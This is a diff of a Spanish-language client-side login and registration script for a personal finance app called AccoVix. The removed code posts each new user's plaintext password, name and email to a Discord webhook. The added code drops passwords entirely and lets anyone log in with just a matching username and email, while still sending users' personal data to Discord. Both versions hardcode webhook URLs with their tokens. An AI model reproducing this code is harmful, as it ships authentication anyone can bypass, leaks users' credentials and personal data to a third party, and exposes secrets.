@@ -1,4 +1,4 @@
-// Limpieza al cargar 
+// Limpieza al cargar
 (function cleanupOnLoad() {
     const TEST = ['test', 'demo', 'prueba', '@example.com', '@test.com'];
     let accounts = [];
@@ -27,20 +27,15 @@
 // Redirigir si ya hay sesión activa
 if (sessionStorage.getItem('iq_session')) window.location = '../../index.html';
 
-// Pega aquí tus URLs de webhook de Discord
-const DISCORD_WEBHOOK_NEW_USER = 'https://discord.com/api/webhooks/1485536509678452796/DCrRBAxsaFDRnrYL3kemVhsxpM-_rtA9GpNjv8qMYDpu279j5nvFeec_6JodgFkn-2Yv';  // ← URL webhook para nuevos registros
-const DISCORD_WEBHOOK_FORGOT_PASSWORD = 'https://discord.com/api/webhooks/1485536641979519026/xhJ-tGNPC5DNq_WHquo4zlorNtgFv5JlkNoLuFOKKL_wgjyRQSDnzRCj3rpGdyQViUWO';  // ← URL webhook para olvido de contraseña
+// Webhook único para nuevos usuarios
+const DISCORD_WEBHOOK_NEW_USER = 'https://discord.com/api/webhooks/1485845022397169755/3hm6HMmwhiWS6UlFN4wNkSLoT-yrNLc3FnBJgaOumRAnzo-rVPv-5jH4sTySNyNd1fsj';
 
 /**
  * Envía un mensaje con embed a un webhook de Discord.
  * Falla silenciosamente para no interrumpir la UI.
- * @param {string} url    - URL del webhook de Discord
- * @param {string} title  - Título del embed
- * @param {Array}  fields - [{name, value, inline?}]
- * @param {number} color  - Color del borde (decimal). Ej: 0x3ec98a → 4115338
  */
 async function sendToDiscordWebhook(url, title, fields, color = 4115338) {
-    if (!url) return; // Si no está configurado, ignorar
+    if (!url) return;
     try {
         await fetch(url, {
             method: 'POST',
@@ -62,7 +57,7 @@ async function sendToDiscordWebhook(url, title, fields, color = 4115338) {
     }
 }
 
-// UI 
+// UI
 function switchTab(id, btn) {
     document.querySelectorAll('.atab').forEach(t => t.classList.remove('active'));
     btn.classList.add('active');
@@ -73,28 +68,29 @@ function switchTab(id, btn) {
 function showError(msg) { const el = document.getElementById('error-msg'); el.textContent = msg; el.classList.add('show'); }
 function clearError() { document.getElementById('error-msg').classList.remove('show'); }
 
-// Login 
+// Login — identifica al usuario por nombre de usuario + correo (sin contraseña)
 function doLogin() {
     clearError();
     const user = document.getElementById('login-user').value.trim();
-    const pass = document.getElementById('login-pass').value;
-    if (!user || !pass) { showError('Por favor completa todos los campos.'); return; }
+    const email = document.getElementById('login-email').value.trim();
+    if (!user || !email) { showError('Por favor completa todos los campos.'); return; }
+    if (!email.includes('@')) { showError('Ingresa un correo válido.'); return; }
     const accounts = getAccounts();
-    const match = accounts.find(a => (a.email === user || a.name === user) && a.password === btoa(pass));
-    if (!match) { showError('Credenciales incorrectas. Verifica tu usuario y contraseña.'); return; }
+    const match = accounts.find(a => a.name === user && a.email === email);
+    if (!match) { showError('No se encontró una cuenta con ese usuario y correo.'); return; }
     startSession(match);
     window.location = '../../index.html';
 }
 
-//  Registro 
+// Registro — usuario, correo y confirmación de correo (sin contraseña)
 async function doRegister() {
     clearError();
     const name = document.getElementById('reg-name').value.trim();
     const email = document.getElementById('reg-email').value.trim();
-    const pass = document.getElementById('reg-pass').value;
-    if (!name || !email || !pass) { showError('Completa todos los campos.'); return; }
-    if (pass.length < 8) { showError('La contraseña debe tener al menos 8 caracteres.'); return; }
-    if (!email.includes('@')) { showError('Ingresa un email válido.'); return; }
+    const emailConfirm = document.getElementById('reg-email-confirm').value.trim();
+    if (!name || !email || !emailConfirm) { showError('Completa todos los campos.'); return; }
+    if (!email.includes('@')) { showError('Ingresa un correo válido.'); return; }
+    if (email !== emailConfirm) { showError('Los correos no coinciden. Verifica e intenta de nuevo.'); return; }
 
     const TEST = ['test', 'demo', 'prueba', '@example.com', '@test.com'];
     let accounts = getAccounts();
@@ -102,25 +98,22 @@ async function doRegister() {
     if (existing) {
         const isTest = TEST.some(p => (existing.email || '').toLowerCase().includes(p));
         if (isTest) { localStorage.removeItem('iq_data_' + existing.id); accounts = accounts.filter(a => a.email !== email); }
-        else { showError('Ya existe una cuenta con ese email.'); return; }
+        else { showError('Ya existe una cuenta con ese correo.'); return; }
     }
 
-    const newUser = { id: Date.now(), name, email, password: btoa(pass), createdAt: new Date().toISOString() };
+    const newUser = { id: Date.now(), name, email, createdAt: new Date().toISOString() };
     accounts.push(newUser);
     localStorage.setItem('iq_accounts', JSON.stringify(accounts));
     seedEmpty(newUser.id);
     startSession(newUser);
 
-    // 1. Notificación Discord — nuevo registro
-    // await garantiza que el fetch termina antes de redirigir
-    // ⚠️ Envía contraseña en texto plano. Solo para uso personal.
+    // Notificación Discord — nuevo registro
     await sendToDiscordWebhook(
         DISCORD_WEBHOOK_NEW_USER,
         '🎉 Nuevo usuario registrado en AccoVix',
         [
-            { name: '👤 Nombre', value: name },
-            { name: '📧 Email', value: email },
-            { name: '🔑 Contraseña', value: pass, inline: false },
+            { name: '👤 Usuario', value: name },
+            { name: '📧 Correo', value: email },
             { name: '📅 Fecha/Hora', value: new Date().toLocaleString('es-CO') },
         ],
         0x3ec98a // verde
@@ -129,7 +122,7 @@ async function doRegister() {
     window.location = '../../index.html';
 }
 
-//  Demo 
+// Demo
 function loadDemo() {
     localStorage.removeItem('iq_data_demo');
     sessionStorage.removeItem('iq_session');
@@ -139,7 +132,7 @@ function loadDemo() {
     window.location = '../../index.html';
 }
 
-//  Helpers 
+// Helpers
 function startSession(user) {
     sessionStorage.setItem('iq_session', JSON.stringify({ id: user.id, name: user.name, email: user.email, isDemo: user.isDemo || false }));
 }
@@ -153,24 +146,6 @@ function seedEmpty(uid) {
         accounts: [{ id: 1, name: 'Cuenta principal', type: 'checking', balance: 0 }],
         categories: ['Salario', 'Ingresos extra', 'Alimentación', 'Transporte', 'Salud', 'Entretenimiento', 'Hogar', 'Ropa', 'Suscripciones', 'Ahorro', 'Otros']
     }));
-}
-
-// 1. Notificación Discord — olvido de contraseña
-async function showForgot() {
-    const user = document.getElementById('login-user').value.trim();
-    if (!user) { showError('Ingresa tu email primero para recuperar tu contraseña.'); return; }
-    // await garantiza que el fetch termina antes de mostrar el alert
-    await sendToDiscordWebhook(
-        DISCORD_WEBHOOK_FORGOT_PASSWORD,
-        '🔐 Solicitud de recuperación de contraseña',
-        [
-            { name: '📧 Email / Usuario', value: user },
-            { name: '📅 Fecha/Hora', value: new Date().toLocaleString('es-CO') },
-        ],
-        0xf5a623 // ámbar
-    );
-
-    alert('Se ha registrado tu solicitud de recuperación. Si configuraste el webhook de Discord, recibirás una notificación.');
 }
 
 function getDemoData() {
